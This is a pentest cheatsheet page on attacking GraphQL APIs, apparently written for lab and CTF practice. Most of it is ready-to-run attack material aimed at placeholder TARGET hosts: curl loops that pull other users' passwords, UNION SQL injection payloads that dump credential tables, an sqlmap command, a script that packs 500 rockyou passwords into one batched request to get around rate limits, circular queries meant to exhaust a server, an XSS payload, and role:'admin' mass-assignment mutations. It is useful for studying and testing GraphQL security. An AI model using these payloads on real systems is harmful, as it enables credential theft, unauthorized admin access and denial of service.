---
title: "Attacking GraphQL"
description: "Introspection, malicious queries, injection, and auth bypass in GraphQL."
sidebar:
  order: 14
  label: "Attacking GraphQL"
---
> GraphQL API penetration testing: fingerprinting, introspection, IDOR, SQLi, circular query DoS, batching brute-force, and privilege escalation via mutations.

---


## Fingerprinting and Localization

```bash
# Endpoints comunes de GraphQL
/graphql
/api/graphql
/graphql/v1
/api/v1/graphql
/graph

# Verificar si hay GraphiQL (interfaz web interactiva)
curl -s http://TARGET/graphql | grep -i "graphiql\|graphql"

# graphw00f — fingerprint del engine
git clone https://github.com/dolevf/graphw00f
cd graphw00f
pip3 install -r requirements.txt

python3 main.py -d -f -t http://TARGET
# Engines detectados: Graphene, Apollo, Hasura, GraphQL-Go, Sangria, etc.
# -d: detect endpoint automáticamente
# -f: fingerprint del engine
# También devuelve enlace al GraphQL-Threat-Matrix con configuraciones por defecto
```

---

## Introspection — Enumerating the Schema

### Basic Introspection Queries

```graphql
# Listar todos los tipos
{
  __schema {
    types {
      name
    }
  }
}

# Campos de un tipo específico
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Queries disponibles
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}

# Mutations disponibles + argumentos
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type { kind name ofType { kind name } }
        }
      }
    }
  }
}

# Campos de un tipo de input (para mutations)
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

### Complete Introspection (Total Schema Dump)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputInput {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```

### Visualizing the Schema with GraphQL-Voyager

```
1. Run the complete IntrospectionQuery → copy the JSON result
2. Go to: https://graphql-kit.com/graphql-voyager/
   (In a real engagement: clone the repository and host it locally)
3. Click "CHANGE SCHEMA" → "INTROSPECTION" → paste the result → "DISPLAY"
4. Result: visual diagram of all entities and relationships
   → Look for loops (e.g., User ↔ Post) for DoS attacks
   → Identify sensitive fields (password, role, admin)
```

### cURL with Introspection

```bash
# Query via cURL (escapar comillas dentro del JSON)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name } } }"}' | jq

# Listar queries
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' | jq

# Tipos de un objeto
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __type(name: \"UserObject\") { name fields { name type { name kind } } } }"}' | jq
```

---

## IDOR in GraphQL

```bash
# 1. Identificar query que usa argumento de usuario
# Ej: user(username: "htb-stdnt") { id username role }

# 2. Cambiar el argumento al usuario objetivo
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { id username role } }"}' | jq

# 3. Añadir campo password (identificado via introspección)
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"admin\") { username password } }"}' | jq

# Enumerar todos los usuarios con su password
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ users { id username password role } }"}' | jq

# IDOR por ID numérico
for i in $(seq 1 50); do
    curl -s -X POST http://TARGET/graphql \
         -H "Content-Type: application/json" \
         -d "{\"query\":\"{ user(id: $i) { id username password role } }\"}" | jq -c '.'
done
```

---

## SQL Injection in GraphQL

```graphql
# 1. Confirmar SQLi — inyectar comilla simple
{
  user(username: "htb-stdnt'") {
    username
  }
}
# Si responde con error SQL → vulnerable

# 2. Boolean blind — comentar el resto del WHERE
{
  user(username: "htb-stdnt' --") {
    username
  }
}
# Si devuelve el mismo resultado que sin payload → comentario funciona → SQLi confirmado

# 3. UNION-based — enumerar tablas
# (adaptar el número de columnas al resultado de introspección)
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}

# 4. UNION — dump de columnas de una tabla
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='users'-- -") {
    username
  }
}

# 5. UNION — extraer datos
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6 FROM users-- -") {
    username
  }
}
```

```bash
# Via cURL (escapar comillas dobles con \")
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ user(username: \"x'"'"' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -\") { username } }"}' | jq

# SQLMap contra GraphQL (experimentar con --data y --level)
sqlmap -u "http://TARGET/graphql" \
       --data='{"query":"{ user(username: \"*\") { username } }"}' \
       --headers="Content-Type: application/json" \
       --level=3 --risk=2 --batch --dbms=mysql
```

---

## DoS — Circular Query

```graphql
# Identificar loop en Voyager: ej. UserObject.posts → PostObject.author → UserObject
# Explotar el loop anidando niveles (respuesta crece exponencialmente)

# Nivel 3 — baseline (respuesta grande)
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}

# Nivel alto — puede crashear el servidor/GraphiQL
# (repetir el patrón posts → author → posts → edges → node → author... N veces)
```

> **Note:** In CTFs/exams, demonstrating the vulnerability with 3-4 levels is sufficient for the report. It is not necessary to crash the actual server.

---

## Batching — Brute-Force Rate Limit Bypass

```bash
# Batching = múltiples queries en un solo HTTP request (JSON array)

# Ejemplo: 2 queries normales en 1 request
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '[
       {"query":"{ user(username: \"admin\") { uuid } }"},
       {"query":"{ post(id: 1) { title } }"}
     ]' | jq

# Brute-force de login via batching (evadir rate limit por request)
# Generar JSON array con N queries de login diferentes:
python3 -c "
import json

passwords = open('/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt').read().splitlines()
batch = []
for pwd in passwords[:500]:  # 500 intentos en 1 request
    batch.append({'query': f'mutation {{ login(username: \"admin\", password: \"{pwd}\") {{ token }} }}'})
print(json.dumps(batch))
" > batch_payload.json

curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d @batch_payload.json | jq '.[].data.login | select(. != null)'
```

---

## Mutations — Privilege Escalation

```graphql
# 1. Descubrir mutations disponibles (ver sección introspección)
# 2. Identificar campos privilegiados en el input (ej: "role")

# Registrar usuario normal
mutation {
  registerUser(input: {
    username: "attacker"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "user"
    msg: "test"
  }) {
    user { username role }
  }
}

# Mass Assignment en mutation: inyectar role:"admin"
mutation {
  registerUser(input: {
    username: "attacker_admin"
    password: "5f4dcc3b5aa765d61d8327deb882cf99"
    role: "admin"
    msg: "Hacked!"
  }) {
    user { username role }
  }
}
# Si response refleja role:"admin" → escalada exitosa

# Otros campos privilegiados a probar en mutations:
# isAdmin: true
# verified: true
# approved: true
# accountType: "premium"
```

```bash
# MD5 de password para mutations que lo requieran
echo -n 'password' | md5sum
# → 5f4dcc3b5aa765d61d8327deb882cf99

# Ejecutar mutation via cURL
curl -s -X POST http://TARGET/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation { registerUser(input: {username: \"attacker\", password: \"5f4dcc3b5aa765d61d8327deb882cf99\", role: \"admin\", msg: \"test\"}) { user { username role } } }"}' | jq
```

---

## GraphQL-Cop — Automated Audit

```bash
# Instalación
git clone https://github.com/dolevf/graphql-cop
cd graphql-cop
pip3 install -r requirements.txt

# Audit básico (sin auth)
python3 graphql-cop.py -t http://TARGET/graphql

# Con auth (bearer token)
python3 graphql-cop.py -t http://TARGET/graphql \
     -H "Authorization: Bearer TOKEN"

# Output típico:
# [HIGH] Alias Overloading - DoS via 100+ aliases
# [HIGH] Array-based Query Batching - Batching habilitado → brute-force amplification
# [HIGH] Directive Overloading - DoS via directives duplicados
# [HIGH] Field Duplication - DoS via 500 campos repetidos
# [HIGH] Introspection - Información del schema expuesta
# [MEDIUM] GET Method Query Support - CSRF posible
# [LOW] Field Suggestions - Leakage de nombres de campo
# [LOW] GraphiQL IDE - Interfaz de debug expuesta
```

---

## InQL (Burp Extension)

```
Installation:
  Burp → Extensions → BApp Store → search for "InQL" → Install

Key features:
  1. "InQL" tab → enter the GraphQL URL → "Analyze" → lists all queries/mutations
  2. In Proxy History / Repeater: "GraphQL" tab → edit the query without dealing with JSON
  3. Right-click on GraphQL request → Extensions → InQL → "Generate queries with InQL Scanner"
  4. Batch attack from InQL → right-click → "InQL - Batch Attack"

Useful for:
  - Automatically generating queries for all types
  - Modifying queries legibly (without escaping quotes)
  - Identifying available fields without manual introspection
```

---

## Quick Reference — GraphQL Vulnerabilities

| Vulnerability | Sign / Indicator | Attack |
|----------------|-------|--------|
| IDOR | Query accepts username/id → returns other users' data | Change argument to another user |
| SQLi | `'` in argument → SQL error in response | `' UNION SELECT ... -- -` |
| XSS | Argument reflected in HTML error without encoding | `<script>alert(1)</script>` in integer argument |
| DoS | Loop between types (User↔Post) | Nest loop 10+ levels |
| Batching abuse | Batching enabled + login in mutation | JSON array with 1000 queries |
| Privilege escalation | Mutation with `role` field in input | `role: "admin"` in registerUser |
| Info Disclosure | Introspection enabled | `__schema { types { name } }` |
| Info Disclosure | Active field suggestions | Errors with "Did you mean..." |

---

## Pitfalls / Gotchas

- **Introspection disabled:** if `__schema` returns an error, try field suggestions: write an incorrect field name and see if the error says "Did you mean X?" — the engine suggests real names.
- **Connections (edges/node) in queries:** some types are `connections` (Relay pagination). To access the objects: `{ posts { edges { node { title } } } }` — forgetting `edges`/`node` returns an error.
- **SQLi: number of columns in UNION:** use introspection to count the fields of the returned type. A `UserObject` with 6 fields requires `UNION SELECT 1,2,3,4,5,6`.
- **GraphQL via GET also works:** `GET /graphql?query={users{username}}` — if enabled, it can be a CSRF vector.
- **DoS: do not crash the real target:** demonstrate with 3-4 levels. HTB labs can be crashed; in a real pentest, stop before crashing.
- **Mutations with MD5 password:** some backends expect the password to be already hashed in the mutation — check in the schema or by intercepting normal registration.
- **Batching might be disabled:** if the JSON array returns an error, verify if graphql-cop reports it as enabled first.
- **GraphiQL in production = finding in itself:** the exposed debug interface is a Medium/High finding — it allows executing queries directly from the browser without additional auth.

---

## Related Cheatsheets

- [API Attacks](/en/metodologias/web/api-attacks/) — OWASP API Top 10, BOLA/IDOR in REST
- [Web Requests](/en/metodologias/fundamentos/web-requests/) — cURL for manual GraphQL queries
- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — discovering the /graphql endpoint with ffuf
- [Broken Authentication](/en/metodologias/web/broken-authentication/) — credentials brute-force
- [Server-side Attacks](/en/metodologias/web/server-side-attacks/) — SSRF possible via URI fields in mutations
